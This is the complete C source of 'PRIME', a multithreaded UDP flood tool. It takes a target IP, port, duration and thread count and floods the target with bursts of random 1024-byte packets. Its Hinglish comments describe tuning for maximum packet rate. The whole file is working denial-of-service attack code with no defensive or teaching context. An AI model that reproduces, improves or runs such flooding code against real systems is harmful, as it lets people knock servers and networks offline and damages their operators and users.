#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>

struct thread_data {
    char ip[16];
    int port;
    int duration;
};

void *prime_strike(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    char target_ip[16];
    int target_port = data->port;
    int target_duration = data->duration;
    
    strcpy(target_ip, data->ip);
    free(arg); 

    int sock;
    struct sockaddr_in server_addr;
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;

    // ✨ Optimization: Buffer size badhao taaki packets drop na hon
    int buf_size = 1024 * 1024; 
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    fcntl(sock, F_SETFL, O_NONBLOCK);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);

    // ✨ Optimization: Payload loop ke bahar ek baar generate karo
    char payload[1024];
    for (int i = 0; i < 1024; i++) payload[i] = (char)(rand() % 255);

    time_t end_time = time(NULL) + target_duration;
    
    while (time(NULL) < end_time) {
        // ✨ High Speed Burst: No usleep, No heavy rand() inside loop
        for (int i = 0; i < 200; i++) { 
            sendto(sock, payload, 1024, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        }
        // Micro-sleep sirf system crash bachane ke liye
        usleep(1); 
    }
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: ./PRIME <ip> <port> <time> <threads>\n");
        return 1;
    }

    int threads_count = atoi(argv[4]);
    pthread_t *thread_id = malloc(threads_count * sizeof(pthread_t));
    srand(time(NULL));

    for (int i = 0; i < threads_count; i++) {
        struct thread_data *t_data = malloc(sizeof(struct thread_data));
        strncpy(t_data->ip, argv[1], 15);
        t_data->ip[15] = '\0';
        t_data->port = atoi(argv[2]);
        t_data->duration = atoi(argv[3]);
        pthread_create(&thread_id[i], NULL, prime_strike, (void *)t_data);
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(thread_id[i], NULL);
    }

    free(thread_id);
    return 0;
}
